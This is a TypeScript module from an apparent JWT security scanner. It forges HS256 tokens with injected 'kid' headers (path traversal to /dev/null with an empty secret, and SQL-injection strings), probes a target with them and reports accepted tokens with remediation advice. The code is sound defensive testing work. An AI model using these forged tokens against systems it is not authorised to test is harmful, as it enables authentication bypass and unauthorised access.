import type { Check, Finding } from "../types.js";
import { signHs256 } from "../jwt.js";
import { probe } from "../targets/httpTarget.js";

const KID_PAYLOADS = [
  "../../../../../../dev/null",
  "/dev/null",
  "' UNION SELECT 'AAAA",
  "key1' OR '1'='1",
];

export const kidInjectionCheck: Check = {
  id: "JWT-004",
  title: "kid header injection",
  applies: (ctx) => Boolean(ctx.token && ctx.target),
  async run(ctx): Promise<Finding[]> {
    if (!ctx.token || !ctx.target) return [];
    const findings: Finding[] = [];

    for (const kid of KID_PAYLOADS) {
      const header = { ...ctx.token.header, alg: "HS256", kid };
      const secret = kid === "../../../../../../dev/null" || kid === "/dev/null" ? "" : "AAAA";
      const forged = signHs256(header, ctx.token.payload, secret);
      const res = await probe(ctx.target, forged);
      if (res.accepted) {
        findings.push({
          id: `${this.id}-${Buffer.from(kid).toString("hex").slice(0, 8)}`,
          title: `kid injection accepted: ${kid}`,
          severity: "critical",
          description:
            "The server resolved a key based on a tampered 'kid' header. This indicates path traversal, SQL injection, or unsafe key lookup.",
          evidence: `kid: ${kid}\nForged: ${forged}\nStatus: ${res.status}`,
          remediation:
            "Treat 'kid' as untrusted input. Look up keys via a strict allowlist (UUID/lookup table); never read from filesystem or build SQL with it.",
        });
      }
    }
    return findings;
  },
};
